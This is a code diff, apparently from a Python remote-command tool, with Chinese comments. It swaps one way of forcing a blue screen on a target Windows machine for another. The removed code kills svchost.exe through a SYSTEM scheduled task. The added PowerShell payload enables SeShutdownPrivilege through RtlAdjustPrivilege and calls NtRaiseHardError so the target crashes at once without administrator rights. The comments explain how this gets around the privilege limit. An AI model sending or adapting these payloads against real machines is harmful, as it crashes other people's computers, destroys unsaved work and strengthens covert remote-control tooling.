@@ -35,20 +35,24 @@ COMMAND_MAX_BYTES = (len(basicCMD['-c']) - COMMAND_OFFSET - 2) // 2 * 2
 LOGOFF_COMMAND = "shutdown /l"
 
 
-# 蓝屏：用 SYSTEM 权限的计划任务结束 svchost.exe。命令通道不是管理员身份，
-# 因此靠 schtasks 以 SYSTEM 建一次性任务再立即运行；脚本按通道上限分片下发。
-# 触发时间取目标本机时间加十几秒，并按 schtasks 要求的 MM/dd/yyyy 与 HH:mm 书写。
-BLUE_SCREEN_TASK_NAME = "SvcHostDiag"
+# 蓝屏：先启用关机特权，再让内核按硬错误蓝屏。命令通道只有普通用户令牌，
+# 但 SeShutdownPrivilege（关闭系统）在工作站默认授予 Users，只是默认禁用，
+# RtlAdjustPrivilege 可自行启用，因此不需要管理员，也不依赖计划任务。
+# 特权号 19 是 SeShutdownPrivilege；状态码 0xC0000420 传给有符号参数时写成
+# 负数；响应选项 6 表示关机，系统立刻按这个状态码蓝屏并重启。
+BLUE_SCREEN_PRIVILEGE = 19
 
-# 计划任务的触发时间相对目标本机时间推后多少秒。
-BLUE_SCREEN_TRIGGER_SECONDS = 15
+BLUE_SCREEN_STATUS = -1073740768
+
+BLUE_SCREEN_RESPONSE = 6
 
 BLUE_SCREEN_SCRIPT = (
-    "$t='%s';$s=(Get-Date).AddSeconds(%d);"
-    % (BLUE_SCREEN_TASK_NAME, BLUE_SCREEN_TRIGGER_SECONDS)
-    + "schtasks /Create /TN $t /SC ONCE /ST $s.ToString('HH\\:mm') "
-    "/SD $s.ToString('MM\\/dd\\/yyyy') /RL HIGHEST /RU "
-    "'NT AUTHORITY\\SYSTEM' /TR "
-    "'cmd /c taskkill /f /im svchost.exe' /F;"
-    "schtasks /Run /TN $t"
+    "$r=0;Add-Type -Name W -Namespace N -MemberDefinition "
+    "'[DllImport(\"ntdll.dll\")]public static extern int "
+    "RtlAdjustPrivilege(int a,int b,int c,out int r);"
+    "[DllImport(\"ntdll.dll\")]public static extern int "
+    "NtRaiseHardError(int a,int b,int c,int d,int e,out int f);';"
+    "[void][N.W]::RtlAdjustPrivilege(%d,1,0,[ref]$r);"
+    "[void][N.W]::NtRaiseHardError(%d,0,0,0,%d,[ref]$r)"
+    % (BLUE_SCREEN_PRIVILEGE, BLUE_SCREEN_STATUS, BLUE_SCREEN_RESPONSE)
 )
